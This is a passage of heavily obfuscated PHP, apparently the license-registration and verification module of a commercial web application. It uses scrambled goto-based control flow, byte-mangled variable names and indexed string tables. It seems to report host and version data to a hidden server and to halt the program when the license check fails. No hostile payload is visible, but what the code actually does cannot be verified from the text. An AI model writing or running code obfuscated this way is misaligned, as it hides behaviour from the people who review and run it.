$F‚÷ƒêä÷¨ = $Bã¥â‡¨÷Ñ[609]; while (strlen($F‚÷ƒêä÷¨) < $Bã¥â‡¨÷Ñ[580]) { if (!$F‚÷ƒêä÷¨) { break; } $F‚÷ƒêä÷¨++; } goto e¸Áª¾õºÛ; D¬‡††ò ‹: $dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[106]][$bÏà±–‚ÏÔ[107]][$bÏà±–‚ÏÔ[112]] = array($bÏà±–‚ÏÔ[113] => (int) $eİÎÓèÑÆ[$bÏà±–‚ÏÔ[114]], $bÏà±–‚ÏÔ[115] => (int) $bÏà±–‚ÏÔ[116]($eİÎÓèÑÆ, $bÏà±–‚ÏÔ[117], 0)); $dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[118]][$bÏà±–‚ÏÔ[119]] = $bÏà±–‚ÏÔ[120]($bÏà±–‚ÏÔ[121])->{$_SERVER[…‹Çæ¦§][122]}(); $dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[118]][$bÏà±–‚ÏÔ[123]] = $bÏà±–‚ÏÔ[124]($_SERVER[$bÏà±–‚ÏÔ[125]] . $cß·«¹í ›[$bÏà±–‚ÏÔ[126]]); goto a¤‡ùñÏ„˜; e¸Áª¾õºÛ: unset($dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[106]][$bÏà±–‚ÏÔ[107]][$bÏà±–‚ÏÔ[76]]); $B°áîÓÒ›£ = $Bã¥â‡¨÷Ñ[610]; unset($dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[106]][$bÏà±–‚ÏÔ[107]][$bÏà±–‚ÏÔ[111]]); goto D¬‡††ò ‹; E‡ßËä–Ú: unset($dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[106]][$bÏà±–‚ÏÔ[108]][$bÏà±–‚ÏÔ[109]]); $B…¼¤§õÙï = $Bã¥â‡¨÷Ñ[608]; if (strlen($B…¼¤§õÙï) < $Bã¥â‡¨÷Ñ[585]) { die; } goto fÓš³„¤ß³; cŞšÂóä‰Î: $dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[118]][$bÏà±–‚ÏÔ[130]] = $this->pnmf7526c11b; $aÓÑš ´İÕ = $Bã¥â‡¨÷Ñ[612]; if (strlen($aÓÑš ´İÕ) < $Bã¥â‡¨÷Ñ[606]) { die; } goto f›áº…õª•; f›áº…õª•: if ($cß·«¹í ›[$bÏà±–‚ÏÔ[130]] != $bÏà±–‚ÏÔ[131]) { $dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[118]][$bÏà±–‚ÏÔ[132]] = $cß·«¹í ›[$bÏà±–‚ÏÔ[132]]; $dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[118]][$bÏà±–‚ÏÔ[133]] = $cß·«¹í ›[$bÏà±–‚ÏÔ[133]]; $F×¯´ËÀà™ = $bÏà±–‚ÏÔ[134](10) . $this->pnmf7526c11b . $bÏà±–‚ÏÔ[134](5); $dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[106]][$bÏà±–‚ÏÔ[135]][$bÏà±–‚ÏÔ[136]] = $this->{$_SERVER[…‹Çæ¦§][137]}($F×¯´ËÀà™, $dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[118]][$bÏà±–‚ÏÔ[123]]); } if ($this->pnmf7526c11b == $bÏà±–‚ÏÔ[131]) { $dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[106]][$bÏà±–‚ÏÔ[107]][$bÏà±–‚ÏÔ[112]][$bÏà±–‚ÏÔ[117]] = 0; } $dïŠ”ÖêÇ¦[$bÏà±–‚ÏÔ[118]][$bÏà±–‚ÏÔ[138]] = $bÏà±–‚ÏÔ[116]($this->qzmpeba30b82, $bÏà±–‚ÏÔ[139], $bÏà±–‚ÏÔ[10]); goto AƒÆ“õçà…; aõ¨‰­°šÌ: } private function sqge2c6c83e9() { goto a²Æó¾­êµ; a²Æó¾­êµ: $F©øŠÛğÅÓ =& $_SERVER[´¬]; $F¡Š©½ªĞï =& $_SERVER[…‹Çæ¦§]; if ($_SERVER[$F¡Š©½ªĞï[44]] == $F¡Š©½ªĞï[145]) { goto dòÃçÎˆÊ; dòÃçÎˆÊ: $Eˆó¥¨Äæ = array($F¡Š©½ªĞï[130] => $this->pnmf7526c11b, $F¡Š©½ªĞï[146] => $this->{$_SERVER[…‹Çæ¦§][147]}(), $F¡Š©½ªĞï[148] => $F¡Š©½ªĞï[61]($F¡Š©½ªĞï[149])->{$_SERVER[…‹Çæ¦§][150]}()); if ($this->pnmf7526c11b != $F¡Š©½ªĞï[131]) { $Fù¢Ü•”ğò = $F¡Š©½ªĞï[116]($this->qzmpeba30b82, $F¡Š©½ªĞï[151]); if ($Fù¢Ü•”ğò) { $Eˆó¥¨Äæ[$F¡Š©½ªĞï[152]] = $Fù¢Ü•”ğò; $Eˆó¥¨Äæ[$F¡Š©½ªĞï[153]] = $F¡Š©½ªĞï[154]($F¡Š©½ªĞï[116]($this->qzmpeba30b82, $F¡Š©½ªĞï[155])); $Eˆó¥¨Äæ[$F¡Š©½ªĞï[156]] = $F¡Š©½ªĞï[116]($this->qzmpeba30b82, $F¡Š©½ªĞï[141]); } } $Eˆó¥¨Äæ = $this->{$_SERVER[…‹Çæ¦§][157]}($F¡Š©½ªĞï[158]($Eˆó¥¨Äæ), $F¡Š©½ªĞï[124]($F¡Š©½ªĞï[159])); goto Fï¦…‘„Üš; Fï¦…‘„Üš: $b¯óÄˆ¤½¼ = $F©øŠÛğÅÓ[613]; if (strlen($b¯óÄˆ¤½¼) < $F©øŠÛğÅÓ[587]) { return; } $BÖ£Úã—ñ = array($F¡Š©½ªĞï[160] => $Eˆó¥¨Äæ); goto dÓØ¶Úæöï; dÓØ¶Úæöï: $F¡Š©½ªĞï[13](array($F¡Š©½ªĞï[161], $F¡Š©½ªĞï[162]), $BÖ£Úã—ñ); $a¬ ‹ƒ«ù = $F©øŠÛğÅÓ[614]; goto aÍ‘Æ½¸–Ù; aÍ‘Æ½¸–Ù: } goto F›Ú¸ÈÒó·; F´±¤¦Şò´: $FÎ¯ˆîÖé‰ = $F©øŠÛğÅÓ[616]; if (strlen($FÎ¯ˆîÖé‰) < $F©øŠÛğÅÓ[578]) { die; } foreach ($bã‡ÉÒåè as $DÏØİê•‰³) { if (!isset($Eäğ†˜‡º®[$DÏØİê•‰³]) || !$Eäğ†˜‡º®[$DÏØİê•‰³]) { continue; } $BÖ£Úã—ñ[$DÏØİê•‰³] = $Eäğ†˜‡º®[$DÏØİê•‰³]; } goto C§…Æ’ôÓ; B•ƒø…ÛØ: if (!$b» ò„ÙïÛ) { return; } $Eäğ†˜‡º® = $F¡Š©½ªĞï[61]($F¡Š©½ªĞï[62])->{$_SERVER[…‹Çæ¦§][63]}(); $BÖ£Úã—ñ = array($F¡Š©½ªĞï[169] => $Eäğ†˜‡º®[$F¡Š©½ªĞï[64]], $F¡Š©½ªĞï[170] => $Eäğ†˜‡º®[$F¡Š©½ªĞï[65]], $F¡Š©½ªĞï[171] => $F¡Š©½ªĞï[10]); goto F´±¤¦Şò´; F›Ú¸ÈÒó·: if ($this->pnmf7526c11b == $F¡Š©½ªĞï[131]) { return; } $bã‡ÉÒåè = array($F¡Š©½ªĞï[163], $F¡Š©½ªĞï[164], $F¡Š©½ªĞï[165], $F¡Š©½ªĞï[166], $F¡Š©½ªĞï[167], $F¡Š©½ªĞï[168]); $b» ò„ÙïÛ = $F©øŠÛğÅÓ[615]; goto B•ƒø…ÛØ; C§…Æ’ôÓ: $F¡Š©½ªĞï[13](array($F¡Š©½ªĞï[161], $F¡Š©½ªĞï[162]), $BÖ£Úã—ñ); $fƒÕ®¢ÉÅ = $F©øŠÛğÅÓ[617]; while (strlen($fƒÕ®¢ÉÅ) < $F©øŠÛğÅÓ[578]) { if (!$fƒÕ®¢ÉÅ) { break; } $fƒÕ®¢ÉÅ++; } goto Cë…Ôá¾“¨; Cë…Ôá¾“¨: } private function abpu305aa14b() { goto B‚›¿‚²Šî; e‰ÑŸ½«£°: $Fö‹œéÌ…Ñ[61]($Fö‹œéÌ…Ñ[11])->{$_SERVER[…‹Çæ¦§][236]}($D…Œï×Œ‹À[$Fö‹œéÌ…Ñ[237]], array($Fö‹œéÌ…Ñ[238] => $B÷¶§è‹‘µ)); $B·”ÃìŸ˜ = $AĞƒŸŞ®–ö[623]; if (strlen($B·”ÃìŸ˜) < $AĞƒŸŞ®–ö[587]) { return; } goto d‡ß‹×ÖÁ¡; F²ÍÈÉ¶¯Ò: if (!$f·»‰Èç¨º) { die; } $FÒ•±¸ê…¿ = $Fö‹œéÌ…Ñ[224]($Fö‹œéÌ…Ñ[25]($f Û¹ßØ–, 10, 16)); $FºÙæè˜†Ğ = $this->{$_SERVER[…‹Çæ¦§][137]}($Fö‹œéÌ…Ñ[158]($dŞ¬øÜñÎó), $f Û¹ßØ–); goto Aßã›œœ ; a£ ‡ïàÆ: if (!$Fö‹œéÌ…Ñ[116]($GLOBALS, $Fö‹œéÌ…Ñ[142])) { die; } $cîÆÅ¬¢÷‡ = $GLOBALS[$Fö‹œéÌ…Ñ[22]]; if (isset($cîÆÅ¬¢÷‡[$Fö‹œéÌ…Ñ[173]])) { $this->{$_SERVER[…‹Çæ¦§][174]}(); die; } goto Dï™Ó¼éÚÑ; AŠ¤ŒŠ²ìÚ: $EÔŞí‰Œ¨‘ = $Fö‹œéÌ…Ñ[124]($_SERVER[$Fö‹œéÌ…Ñ[125]] . $d™ùÖÇ¶¦²); $bÄÂ„á¯Ô = $AĞƒŸŞ®–ö[618]; if ($cîÆÅ¬¢÷‡[$Fö‹œéÌ…Ñ[188]] == $Fö‹œéÌ…Ñ[189]) { $c“†…Ğ‘‡ = $this->{$_SERVER[…‹Çæ¦§][157]}($EÔŞí‰Œ¨‘, $Fö‹œéÌ…Ñ[190]); $D§¡é˜º = $this->{$_SERVER[…‹Çæ¦§][137]}($Fö‹œéÌ…Ñ[158]($aïíÓ•íêª), $EÔŞí‰Œ¨‘ . $Fö‹œéÌ…Ñ[191], 3); $D§¡é˜º = $D§¡é˜º . $Fö‹œéÌ…Ñ[192] . $_SERVER[$Fö‹œéÌ…Ñ[183]]; $AÚ¶½¹Øâœ = $this->{$_SERVER[…‹Çæ¦§][193]}($Fö‹œéÌ…Ñ[194] . $c“†…Ğ‘‡ . $Fö‹œéÌ…Ñ[195] . $D§¡é˜º, -1); $Fö‹œéÌ…Ñ[176]($AÚ¶½¹Øâœ, !0); } else { if ($cîÆÅ¬¢÷‡[$Fö‹œéÌ…Ñ[188]] == $Fö‹œéÌ…Ñ[196]) { $B¹Ò…˜¥ = $Fö‹œéÌ…Ñ[25]($Fö‹œéÌ…Ñ[124]($Fö‹œéÌ…Ñ[197] . $EÔŞí‰Œ¨‘), 12, 15) . $Fö‹œéÌ…Ñ[198]; $D§¡é˜º = $this->{$_SERVER[…‹Çæ¦§][199]}($Fö‹œéÌ…Ñ[2]($cîÆÅ¬¢÷‡[$Fö‹œéÌ…Ñ[200]]), $B¹Ò…˜¥, 2); $c²ñğ‚¨ £ = $Fö‹œéÌ…Ñ[201]($D§¡é˜º, !0); if (!$Fö‹œéÌ…Ñ[202]($c²ñğ‚¨ £) || !$Fö‹œéÌ…Ñ[202]($c²ñğ‚¨ £[$Fö‹œéÌ…Ñ[203]]) || $c²ñğ‚¨ £[$Fö‹œéÌ…Ñ[175]] != !0) { $f•ß¤¨ËÜ = $Fö‹œéÌ…Ñ[204]; $bÃ­ÂÒĞ‘Ì = $c²ñğ‚¨ £[$Fö‹œéÌ…Ñ[203]] ? $Fö‹œéÌ…Ñ[205] . $c²ñğ‚¨ £[$Fö‹œéÌ…Ñ[203]] : $f•ß¤¨ËÜ; $Fö‹œéÌ…Ñ[176]($bÃ­ÂÒĞ‘Ì, !1); } else { $aïíÓ•íêª[$Fö‹œéÌ…Ñ[178]] = $c²ñğ‚¨ £[$Fö‹œéÌ…Ñ[203]][$Fö‹œéÌ…Ñ[206]]; } } else { $c²ñğ‚¨ £ = $this->{$_SERVER[…‹Çæ¦§][193]}($Fö‹œéÌ…Ñ[207], $aïíÓ•íêª, 10); } } goto fÂ§«¾‹Ä‘; Aßã›œœ : $b¢‡¤„¦™È = $AĞƒŸŞ®–ö[621]; $Cå‹‰ƒÍïÎ = $Fö‹œéÌ…Ñ[232]($Fö‹œéÌ…Ñ[61]($Fö‹œéÌ…Ñ[11])->{$_SERVER[…‹Çæ¦§][233]}(), $Fö‹œéÌ…Ñ[234]); $D…Œï×Œ‹À = $Cå‹‰ƒÍïÎ[$Fö‹œéÌ…Ñ[235]]; goto Eå†Öºñá”; Dï™Ó¼éÚÑ: if (!isset($cîÆÅ¬¢÷‡[$Fö‹œéÌ…Ñ[175]]) || $Fö‹œéÌ…Ñ[24]($cîÆÅ¬¢÷‡[$Fö‹œéÌ…Ñ[175]]) != 16) { $Fö‹œéÌ…Ñ[176]($Fö‹œéÌ…Ñ[177] . $cîÆÅ¬¢÷‡[$Fö‹œéÌ…Ñ[175]], !1); } $d™ùÖÇ¶¦² = $Fö‹œéÌ…Ñ[61]($Fö‹œéÌ…Ñ[62])->{$_SERVER[…‹Çæ¦§][63]}($Fö‹œéÌ…Ñ[126]); $aïíÓ•íêª = array($Fö‹œéÌ…Ñ[175] => $cîÆÅ¬¢÷‡[$Fö‹œéÌ…Ñ[175]], $Fö‹œéÌ…Ñ[178] => $Fö‹œéÌ…Ñ[134](16), $Fö‹œéÌ…Ñ[179] => $Fö‹œéÌ…Ñ[159], $Fö‹œéÌ…Ñ[180] => $Fö‹œéÌ…Ñ[181], $Fö‹œéÌ…Ñ[182] => $_SERVER[$Fö‹œéÌ…Ñ[183]], $Fö‹œéÌ…Ñ[184] => $_SERVER[$Fö‹œéÌ…Ñ[185]], $Fö‹œéÌ…Ñ[186] => $_SERVER[$Fö‹œéÌ…Ñ[187]]); goto AŠ¤ŒŠ²ìÚ; d‡ß‹×ÖÁ¡: $this->qzmpeba30b82 = $dŞ¬øÜñÎó; $fèå¸ùäÇé = $AĞƒŸŞ®–ö[624]; while (strlen($fèå¸ùäÇé) < $AĞƒŸŞ®–ö[585]) { if (!$fèå¸ùäÇé) { break; } $fèå¸ùäÇé++; } goto dÍ¼å„“öŠ; eæïÆ±ÌôŞ: if (!$A·ëÛù¹Ñ || $A·ëÛù¹Ñ != $dŞ¬øÜñÎó[$Fö‹œéÌ…Ñ[155]]) { $e³ø¸¼ŠŞ¾ = array($Fö‹œéÌ…Ñ[212] => $Fö‹œéÌ…Ñ[61]($Fö‹œéÌ…Ñ[62])->{$_SERVER[…‹Çæ¦§][63]}($Fö‹œéÌ…Ñ[126]), $Fö‹œéÌ…Ñ[213] => $_SERVER[$Fö‹œéÌ…Ñ[125]], $Fö‹œéÌ…Ñ[214] => $Fö‹œéÌ…Ñ[215](), $Fö‹œéÌ…Ñ[184] => $_SERVER[$Fö‹œéÌ…Ñ[185]]); $D§¡é˜º = $this->{$_SERVER[…‹Çæ¦§][216]}($Fö‹œéÌ…Ñ[158]($e³ø¸¼ŠŞ¾)); $this->{$_SERVER[…‹Çæ¦§][193]}($Fö‹œéÌ…Ñ[217] . $D§¡é˜º); $Fö‹œéÌ…Ñ[176]($Fö‹œéÌ…Ñ[208]($Fö‹œéÌ…Ñ[218]), !0); } $fğ¹ùÎğÈ® = array($Fö‹œéÌ…Ñ[219] => $aïíÓ•íêª[$Fö‹œéÌ…Ñ[175]], $Fö‹œéÌ…Ñ[220] => $dŞ¬øÜñÎó[$Fö‹œéÌ…Ñ[221]], $Fö‹œéÌ…Ñ[222] => $Fö‹œéÌ…Ñ[134](16), $Fö‹œéÌ…Ñ[130] => $dŞ¬øÜñÎó[$Fö‹œéÌ…Ñ[223]]); if ($aïíÓ•íêª[$Fö‹œéÌ…Ñ[178]]) { $fğ¹ùÎğÈ®[$Fö‹œéÌ…Ñ[222]] = $aïíÓ•íêª[$Fö‹œéÌ…Ñ[178]]; } goto C—Êâë“â·; B¬À ¬ªÌÏ: $Fö‹œéÌ…Ñ[61]($Fö‹œéÌ…Ñ[62])->{$_SERVER[…‹Çæ¦§][231]}($fğ¹ùÎğÈ®); $f Û¹ßØ– = $Fö‹œéÌ…Ñ[124]($_SERVER[$Fö‹œéÌ…Ñ[125]] . $Fö‹œéÌ…Ñ[224]($d™ùÖÇ¶¦²) . $fğ¹ùÎğÈ®[$Fö‹œéÌ…Ñ[220]]); $f·»‰Èç¨º = $AĞƒŸŞ®–ö[620]; goto F²ÍÈÉ¶¯Ò; Eå†Öºñá”: $B÷¶§è‹‘µ = array(); $EŠ×ö•åÀ› = $AĞƒŸŞ®–ö[622]; $B÷¶§è‹‘µ[$FÒ•±¸ê…¿] = $FºÙæè˜†Ğ; goto e‰ÑŸ½«£°; fÂ§«¾‹Ä‘: if (!$Fö‹œéÌ…Ñ[202]($c²ñğ‚¨ £) || !$Fö‹œéÌ…Ñ[202]($c²ñğ‚¨ £[$Fö‹œéÌ…Ñ[203]]) || $c²ñğ‚¨ £[$Fö‹œéÌ…Ñ[175]] != !0) { $f•ß¤¨ËÜ = $Fö‹œéÌ…Ñ[208]($Fö‹œéÌ…Ñ[209]); $bÃ­ÂÒĞ‘Ì = $c²ñğ‚¨ £[$Fö‹œéÌ…Ñ[203]] ? $Fö‹œéÌ…Ñ[205] . $c²ñğ‚¨ £[$Fö‹œéÌ…Ñ[203]] : $f•ß¤¨ËÜ; $Fö‹œéÌ…Ñ[176]($bÃ­ÂÒĞ‘Ì, !1); } $dŞ¬øÜñÎó = $c²ñğ‚¨ £[$Fö‹œéÌ…Ñ[203]]; $A·ëÛù¹Ñ = $this->{$_SERVER[…‹Çæ¦§][210]}($dŞ¬øÜñÎó[$Fö‹œéÌ…Ñ[211]]); goto eæïÆ±ÌôŞ; dÍ¼å„“öŠ: $this->pnmf7526c11b = $fğ¹ùÎğÈ®[$Fö‹œéÌ…Ñ[130]]; $this->{$_SERVER[…‹Çæ¦§][239]}(); $f¤Û†œ¬ĞÃ = $AĞƒŸŞ®–ö[625]; goto añ †™Äô; e¿âñÜË˜: $EÍï¦±øÚ = $Fö‹œéÌ…Ñ[134](16); $AÀÓÛĞÆ·ˆ = $AĞƒŸŞ®–ö[619]; if (!$AÀÓÛĞÆ·ˆ) { die; } goto eñÕë”ŠÒ·; eñÕë”ŠÒ·: $D„õÈŞÑ¬Ö = $EÍï¦±øÚ . $fğ¹ùÎğÈ®[$Fö‹œéÌ…Ñ[130]] . $this->{$_SERVER[…‹Çæ¦§][157]}($Fö‹œéÌ…Ñ[124]($fğ¹ùÎğÈ®[$Fö‹œéÌ…Ñ[219]]), $EÍï¦±øÚ); $fğ¹ùÎğÈ®[$Fö‹œéÌ…Ñ[133]] = $Fö‹œéÌ…Ñ[128]($Fö‹œéÌ…Ñ[224]($this->{$_SERVER[…‹Çæ¦§][157]}($D„õÈŞÑ¬Ö, $Fö‹œéÌ…Ñ[226]))); if ($dŞ¬øÜñÎó[$Fö‹œéÌ…Ñ[227]] && $dŞ¬øÜñÎó[$Fö‹œéÌ…Ñ[227]] >= 1) { $Fö‹œéÌ…Ñ[61]($Fö‹œéÌ…Ñ[62])->{$_SERVER[…‹Çæ¦§][228]}($Fö‹œéÌ…Ñ[229], $Fö‹œéÌ…Ñ[230]); } goto B¬À ¬ªÌÏ; B‚›¿‚²Šî: $AĞƒŸŞ®–ö =& $_SERVER[´¬]; $Fö‹œéÌ…Ñ =& $_SERVER[…‹Çæ¦§]; if ($_SERVER[$Fö‹œéÌ…Ñ[44]] != $Fö‹œéÌ…Ñ[172]) { return; } goto a£ ‡ïàÆ; C—Êâë“â·: $A±„·ê‚ğ— = $Fö‹œéÌ…Ñ[25]($Fö‹œéÌ…Ñ[124]($fğ¹ùÎğÈ®[$Fö‹œéÌ…Ñ[220]]), 10, 10); $f‡õŠÁãåò = $A±„·ê‚ğ— . $fğ¹ùÎğÈ®[$Fö‹œéÌ…Ñ[130]] . $fğ¹ùÎğÈ®[$Fö‹œéÌ…Ñ[222]]; $fğ¹ùÎğÈ®[$Fö‹œéÌ…Ñ[132]] = $Fö‹œéÌ…Ñ[224]($Fö‹œéÌ…Ñ[128]($this->{$_SERVER[…‹Çæ¦§][157]}($f‡õŠÁãåò, $Fö‹œéÌ…Ñ[225]))); goto e¿âñÜË˜; añ †™Äô: if (strlen($f¤Û†œ¬ĞÃ) < $AĞƒŸŞ®–ö[578]) { return; } Cache::set($Fö‹œéÌ…Ñ[240] . $Fö‹œéÌ…Ñ[124]($d™ùÖÇ¶¦² . $Fö‹œéÌ…Ñ[241]), $Fö‹œéÌ…Ñ[10]); $Fö‹œéÌ…Ñ[176]($Fö‹œéÌ…Ñ[208]($Fö‹œéÌ…Ñ[218]), !0); goto d…ˆÑæêß«; d…ˆÑæêß«: } private function licenseRegistSuccess() { $bçÏ„„à† =& $_SERVER[…‹Çæ¦§]; $C¹âàÖ¾Š = $bçÏ„„à†[61]($bçÏ„„à†[62])->{$_SERVER[…‹Çæ¦§][63]}(); $FÂ«¬Ãî ¼ = $_SERVER[´¬][626]; if ($C¹âàÖ¾Š[$bçÏ„„à†[93]] != $bçÏ„„à†[230]) { $bçÏ„„à†[61]($bçÏ„„à†[62])->{$_SERVER[…‹Çæ¦§][231]}($bçÏ„„à†[93], $bçÏ„„à†[230]); } $bçÏ„„à†[120]($bçÏ„„à†[242])->{$_SERVER[…‹Çæ¦§][243]}(!0); } private function hrbg33401eb2() { goto B¼Æ ‡Ñ™¸; E¡»‘½©Âï: $this->qzmpeba30b82 = array(); $dÖ¦îŒßçˆ = $FˆÆ§èå„«[628]; while ($dÖ¦îŒßçˆ < $FˆÆ§èå„«[578]) { if ($dÖ¦îŒßçˆ >= 0) { break; } $dÖ¦îŒßçˆ++; } goto C‚ë¯”ó‰ã; C‚ë¯”ó‰ã: $this->pnmf7526c11b = $EÌÙå›Û»¯[131]; goto fÚ²õÌ°Õ; B¼Æ ‡Ñ™¸: $FˆÆ§èå„« =& $_SERVER[´¬]; $EÌÙå›Û»¯ =& $_SERVER[…‹Çæ¦§]; $EÌÙå›Û»¯[61]($EÌÙå›Û»¯[62])->{$_SERVER[…‹Çæ¦§][231]}(array($EÌÙå›Û»¯[219] => $EÌÙå›Û»¯[10], $EÌÙå›Û»¯[220] => $EÌÙå›Û»¯[10], $EÌÙå›Û»¯[130] => $EÌÙå›Û»¯[131], $EÌÙå›Û»¯[132] => $EÌÙå›Û»¯[10], $EÌÙå›Û»¯[133] => $EÌÙå›Û»¯[10])); goto cá¦øµˆ‡Ê; cá¦øµˆ‡Ê: $eÀÈ¹ç°š– = $FˆÆ§èå„«[627]; if (strlen($eÀÈ¹ç°š–) < $FˆÆ§èå„«[606]) { die; } $EÌÙå›Û»¯[61]($EÌÙå›Û»¯[62])->{$_SERVER[…‹Çæ¦§][228]}($EÌÙå›Û»¯[229], $EÌÙå›Û»¯[244]); goto E¡»‘½©Âï; fÚ²õÌ°Õ: } private function mbrd32c1a580() { goto bæŒ½µÚÖÛ; fÕŒ‘ÜŠÏ¸: $this->qzmpeba30b82 = $FÒï¤ŸŠœ; $this->pnmf7526c11b = $eÛ©˜‰ìÍÌ[$dÚÈ¯˜Ê“[130]]; $aÚÕ†òôó = $fÖŒëÒóìÙ[633]; goto E‘É¾ÁÌ“; bÁëà§”ñ¦: $aİ˜ˆ‹Ó = $dÚÈ¯˜Ê“[61]($dÚÈ¯˜Ê“[62])->{$_SERVER[…‹Çæ¦§][63]}($dÚÈ¯˜Ê“[126]); $e¶©»¾‚ÚÚ = $fÖŒëÒóìÙ[631]; if (strlen($e¶©»¾‚ÚÚ) < $fÖŒëÒóìÙ[580]) { die; } goto aÕî½³®‘; dÈ‡™æ³ó‰: if (strlen($a…›Úö¢°‚) < $fÖŒëÒóìÙ[578]) { return; } if (!$dÚÈ¯˜Ê“[202]($FÒï¤ŸŠœ) || !isset($FÒï¤ŸŠœ[$dÚÈ¯˜Ê“[245]]) || $dÚÈ¯˜Ê“[246]() - $FÒï¤ŸŠœ[$dÚÈ¯˜Ê“[245]] >= 60) { $Dà¼¿™°ÑÁ = $dÚÈ¯˜Ê“[232]($dÚÈ¯˜Ê“[61]($dÚÈ¯˜Ê“[11])->{$_SERVER[…‹Çæ¦§][233]}(), $dÚÈ¯˜Ê“[234]); $C¯í‚¨¾±Û = $Dà¼¿™°ÑÁ[$dÚÈ¯˜Ê“[235]]; $D…“ù£¤ĞÜ = $dÚÈ¯˜Ê“[124]($_SERVER[$dÚÈ¯˜Ê“[125]] . $dÚÈ¯˜Ê“[224]($aİ˜ˆ‹Ó) . $eÛ©˜‰ìÍÌ[$dÚÈ¯˜Ê“[220]]); $B÷—óÇºÏ = $dÚÈ¯˜Ê“[224]($dÚÈ¯˜Ê“[25]($D…“ù£¤ĞÜ, 10, 16)); $FÒï¤ŸŠœ = $this->{$_SERVER[…‹Çæ¦§][199]}($C¯í‚¨¾±Û[$dÚÈ¯˜Ê“[104]][$B÷—óÇºÏ], $D…“ù£¤ĞÜ); $FÒï¤ŸŠœ = $dÚÈ¯˜Ê“[201]($FÒï¤ŸŠœ, !0); } if (!$dÚÈ¯˜Ê“[202]($FÒï¤ŸŠœ)) { return $this->{$_SERVER[…‹Çæ¦§][174]}(); } goto eÅÄ›êÛœä; eîªœ®Æ¸Ÿ: $eÛ©˜‰ìÍÌ = $dÚÈ¯˜Ê“[61]($dÚÈ¯˜Ê“[62])->{$_SERVER[…‹Çæ¦§][63]}(); $fÊ´æ»ÈØ = $fÖŒëÒóìÙ[630]; if ($eÛ©˜‰ìÍÌ[$dÚÈ¯˜Ê“[130]] == $dÚÈ¯˜Ê“[131]) { return; } goto bÁëà§”ñ¦; E‘É¾ÁÌ“: if (strlen($aÚÕ†òôó) < $fÖŒëÒóìÙ[578]) { return; } goto cë¾¡¼ˆ¬…; eÅÄ›êÛœä: $f±ƒ®ÖéÔ¢ = $dÚÈ¯˜Ê“[154]($FÒï¤ŸŠœ[$dÚÈ¯˜Ê“[155]]); if ($dÚÈ¯˜Ê“[246]() >= $f±ƒ®ÖéÔ¢) { return $this->{$_SERVER[…‹Çæ¦§][174]}(); } if ($dÚÈ¯˜Ê“[246]() - $FÒï¤ŸŠœ[$dÚÈ¯˜Ê“[245]] > 20) { $FÒï¤ŸŠœ[$dÚÈ¯˜Ê“[245]] = $dÚÈ¯˜Ê“[246](); Cache::set($eÇ§­ËÅŸö, $FÒï¤ŸŠœ); } goto fÕŒ‘ÜŠÏ¸; bæŒ½µÚÖÛ: $fÖŒëÒóìÙ =& $_SERVER[´¬]; $dÚÈ¯˜Ê“ =& $_SERVER[…‹Çæ¦§]; $_SERVER[$dÚÈ¯˜Ê“[185]] = $dÚÈ¯˜Ê“[116]($_SERVER, $dÚÈ¯˜Ê“[185], APP_HOST); goto f¥ÔÚ‘¬¹ó; aÕî½³®‘: $eÇ§­ËÅŸö = $dÚÈ¯˜Ê“[240] . $dÚÈ¯˜Ê“[124]($aİ˜ˆ‹Ó . $dÚÈ¯˜Ê“[241]); $FÒï¤ŸŠœ = Cache::get($eÇ§­ËÅŸö); $a…›Úö¢°‚ = $fÖŒëÒóìÙ[632]; goto dÈ‡™æ³ó‰; f¥ÔÚ‘¬¹ó: $dÇò¥ö„± = $fÖŒëÒóìÙ[629]; if (strlen($dÇò¥ö„±) < $fÖŒëÒóìÙ[606]) { die; } $this->pnmf7526c11b = $dÚÈ¯˜Ê“[131]; goto eîªœ®Æ¸Ÿ; cë¾¡¼ˆ¬…: } private function edqv158b9bbe() { goto e­˜µ®‚¯; e­˜µ®‚¯: $DÛŒËäœ‰ =& $_SERVER[…‹Çæ¦§]; $eìï´§§ÒË = $GLOBALS[$DÛŒËäœ‰[22]]; $FÜù³åÎßõ = $_SERVER[$DÛŒËäœ‰[44]]; goto B¿ô“•„; aÕŸõÎÀƒà: $dÃ’ˆòÀ = array($DÛŒËäœ‰[250], $DÛŒËäœ‰[251]); if ($DÛŒËäœ‰[252]($FÜù³åÎßõ, $dÃ’ˆòÀ)) { if ($this->pnmf7526c11b == $DÛŒËäœ‰[131] && isset($eìï´§§ÒË[$DÛŒËäœ‰[253]])) { $DÛŒËäœ‰[176]($DÛŒËäœ‰[208]($DÛŒËäœ‰[248]), !1, $DÛŒËäœ‰[249]); die; } $dø·¯Ãªã = $this->{$_SERVER[…‹Çæ¦§][147]}(); if ($dø·¯Ãªã != $DÛŒËäœ‰[254]($DÛŒËäœ‰[255])) { if ($dø·¯Ãªã <= $DÛŒËäœ‰[61]($DÛŒËäœ‰[149])->{$_SERVER[…‹Çæ¦§][150]}()) { $DÛŒËäœ‰[176]($DÛŒËäœ‰[208]($DÛŒËäœ‰[256]), !1, $DÛŒËäœ‰[249]); die; } } } goto BáÈ´¡¢¼‰; B¿ô“•„: $a®ç’‘¬ÚŸ = $_SERVER[´¬][634]; if (!$a®ç’‘¬ÚŸ) { die; } if ($FÜù³åÎßõ == $DÛŒËäœ‰[247] && $this->pnmf7526c11b == $DÛŒËäœ‰[131]) { $DÛŒËäœ‰[176]($DÛŒËäœ‰[208]($DÛŒËäœ‰[248]), !1, $DÛŒËäœ‰[249]); } goto aÕŸõÎÀƒà; BáÈ´¡¢¼‰: } private function sbmrc5d5227c() { goto b¥ñŸªäÜ; c¨ ÷Ò¥Ò: while ($d…£ƒ±Éğ < $F›··Óî¯È[578]) { if ($d…£ƒ±Éğ >= 0) { break; } $d…£ƒ±Éğ++; } $CëŒáª“‚[268]($CëŒáª“‚[269]); if ($C¥à­³–‡Ä && $CëŒáª“‚[32]($C¥à­³–‡Ä, $CëŒáª“‚[270])) { echo $C¥à­³–‡Ä; } goto Aæ ˜‰¡; 